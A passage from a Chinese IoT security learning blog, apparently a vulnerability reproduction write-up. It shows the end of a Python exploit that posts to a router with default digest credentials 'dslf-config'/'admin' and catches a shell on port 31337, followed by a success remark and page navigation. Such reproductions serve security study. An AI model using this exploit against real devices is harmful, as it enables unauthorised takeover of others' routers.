</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">HTTPDigestAuth</span><span class="p">(</span><span class="s1">'dslf-config'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">attack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">"getshell"</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span></code></pre></div><p>
<figure>
<img alt="image-20240223213739400" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/8q1Z9eJhUv4BjRH.png"/>
</figure>
</p>
<p>复现成功！</p>
<details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" style="margin-left:0px">
<summary class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        IoT学习小记 - This article is part of a series.
    </summary>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<a href="https://ta0lve.github.io/posts/iot/0x01/">
            Part 1: IoT基础学习
        </a>
</div>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 2: This Article
    </div>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<a href="https://ta0lve.github.io/posts/iot/0x03/">
            Part 3: IoT漏洞挖掘思路
        </a>
</div>
</details>
</div>
<script>
        var oid = "views_posts\\IoT\\0x02\\index.md"
        var oid_likes = "likes_posts\\IoT\\0x02\\index.md"
      </script>
<script integrity="sha512-DkmXO0rQo4LHxgEti/+CJjFmQtqrxPiiBHe9CGdPPabi+pk7wgrU9R58W7aOb5E6IHp8T+N+oOe4BolK/OCmTg==" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" type="text/javascript"></script>
</section>
<footer class="pt-8 max-w-prose print:hidden">
<h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
<section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
<a class="min-w-full" href="/posts/iot/0x03/">
<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
<div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/iot/0x03/featured.jpg);"></div>
<div class="px-6 py-4">
<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/iot/0x03/">IoT漏洞挖掘思路</div>
<div class="text-sm text-neutral-500 dark:text-neutral-400">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2024-02-23 00:00:00 +0000 UTC">February 23, 2024</time><span class="px-2 text-primary-500">·</span><span>3901 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">8 分钟</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<span class="mr-2" onclick="window.open(&quot;/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT学习记录
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/iot/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT
  </span>
</span>
</span>
</div>
</div>
</div>
<div class="px-6 pt-4 pb-2">
</div>
</div>
</a>
<a class="min-w-full" href="/posts/iot/0x01/">
<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
<div class="w-full thumbnail_card_related nozoom" style="background-image:url(/posts/iot/0x01/featured.jpg);"></div>
<div class="px-6 py-4">
<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/iot/0x01/">IoT基础学习</div>
<div class="text-sm text-neutral-500 dark:text-neutral-400">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2024-02-21 00:00:00 +0000 UTC">February 21, 2024</time><span class="px-2 text-primary-500">·</span><time datetime="2024-02-23 00:00:00 +0000 UTC"></time><span class="px-2 text-primary-500">·</span><span>6165 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">13 分钟</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<span class="mr-2" onclick="window.open(&quot;/categories/iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT学习记录
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/iot/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT
  </span>
</span>
</span>
</div>
</div>
</div>
<div class="px-6 pt-4 pb-2">
</div>
</div>
</a>
<a class="min-w-full" href="/posts/pwn/risc-v/0x01/">
<div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
<div class="px-6 py-4">
<div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href="/posts/pwn/risc-v/0x01/">RISC-V PWN学习</div>
<div class="text-sm text-neutral-500 dark:text-neutral-400">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2023-09-03 00:00:00 +0000 UTC">September 3, 2023</time><span class="px-2 text-primary-500">·</span><span>11267 字</span><span class="px-2 text-primary-500">·</span><span title="预计阅读">23 分钟</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<span class="mr-2" onclick="window.open(&quot;/categories/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    PWN学习记录
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/ctf/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    CTF
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/pwn/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    PWN
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/riscv64/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    riscv64
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/%E5%BC%82%E6%9E%84pwn/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    异构PWN
  </span>
</span>
</span>
<span class="mr-2" onclick="window.open(&quot;/tags/iot/&quot;,'_self');" style="margin-top:0.5rem">
<span class="flex">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    IoT
  </span>
</span>
</span>
</div>
</div>
</div>
<div class="px-6 pt-4 pb-2">
</div>
</div>
</a>
</section>
<div class="content" id="content">
<div style="margin-top:2em;padding:0 0.5em;font-size:.875rem">
<hr/>
<br/>
<div style="padding-bottom:1em;">
<p> </p>
<p>本文作者：<a href="https://ta0lve.github.io/about/" target="_blank"><font color="#49b1f5" style="text-decoration: underline">ta0lve</font></a></p>
<p>本文链接：<a href="https://ta0lve.github.io/posts/iot/0x02/" target="_blank"><font color="#49b1f5" style="text-decoration: underline">IoT漏洞复现记录</font></a></p>
<p><a href="https://ta0lve.github.io/posts/iot/0x02/" target="_blank"><font color="#49b1f5" style="text-decoration: underline"> https://ta0lve.github.io/posts/iot/0x02/ </font></a></p>
<p>版权声明：本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank"><font color="#49b1f5" style="text-decoration: underline"> CC BY-NC 4.0 </font></a> 许可协议。</p>
<p>转载请注明来自<a class="redlink" href="https://ta0lve.github.io/" target="_blank"> <font color="#49b1f5" style="text-decoration: underline">ta0lve's Blog</font></a> ！</p>
</div>
</div>
</div>
<div class="pt-8">
<hr class="border-dotted border-neutral-300 dark:border-neutral-600"/>
<div class="flex justify-between pt-3">
<span>
<a class="flex group mr-3" href="/posts/iot/0x01/">
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">←</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">→</span>
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">IoT基础学习</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2024-02-21 00:00:00 +0000 UTC">February 21, 2024</time>
</span>
</span>
</a>
</span>
<span>
<a class="flex text-right group ml-3" href="/posts/iot/0x03/">
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">IoT漏洞挖掘思路</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2024-02-23 00:00:00 +0000 UTC">February 23, 2024</time>
</span>
</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">→</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">←</span>
</a>
</span>
</div>
</div>
<script async="" crossorigin="anonymous" data-category="Announcements" data-category-id="DIC_kwDOJ9Vlo84CX_0P" data-emit-metadata="0" data-input-position="bottom" data-lang="zh-CN" data-mapping="pathname" data-reactions-enabled="1" data-repo="ta0lve/blogtalk" data-repo-id="R_kgDOJ9Vlow" data-strict="0" data-theme="dark_dimmed" src="https://giscus.app/client.js">
</script>
</footer>
</article>
<div class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0" id="top-scroller">
<a aria-label="" class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" href="#the-top" title="">
    ↑
  </a>
</div>
</main><footer class="py-10 print:hidden" id="site-footer">
<nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
<ul class="flex flex-col list-none sm:flex-row">
<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/about/" title="About">About</a>
</li>
<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/pwn/" title="PWN">pwn2own , pwn4fun</a>
</li>
</ul>
</nav>
<div class="flex items-center justify-between">
<p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright ©2024 ta0lve, All Rights Reserved.
    </p>
<p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://blowfish.page/" rel="noopener noreferrer" target="_blank">Blowfish</a> 强力驱动
    </p>
</div>
<script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
<script integrity="sha512-NcERO8wWxaWb8DEIL55jgiqpUoBCOIGnhHp/8zoW5imc5qhA2e9OENlH4DChjz8gNZr7LsDzWWdIS5qTYKwxRQ==" src="/js/process.min.35c1113bcc16c5a59bf031082f9e63822aa95280423881a7847a7ff33a16e6299ce6a840d9ef4e10d947e030a18f3f20359afb2ec0f35967484b9a9360ac3145.js" type="text/javascript"></script>
</footer><div class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url="https://ta0lve.github.io/" id="search-wrapper" style="z-index:500">
<div class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800" id="search-modal">
<header class="relative z-10 flex items-center justify-between flex-none px-2">
<form class="flex items-center flex-auto min-w-0">
<div class="flex items-center justify-center w-8 h-8 text-neutral-400">
<span class="relative block icon">
<svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</div>
<input class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" id="search-query" placeholder="" tabindex="0" type="search"/>
</form>
<button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" id="close-search-button" title="">
<span class="relative block icon">
<svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</button>
</header>
<section class="flex-auto px-2 overflow-auto">
<ul id="search-results">
</ul>
</section>
</div>
</div>
</div>
</body>
</html>
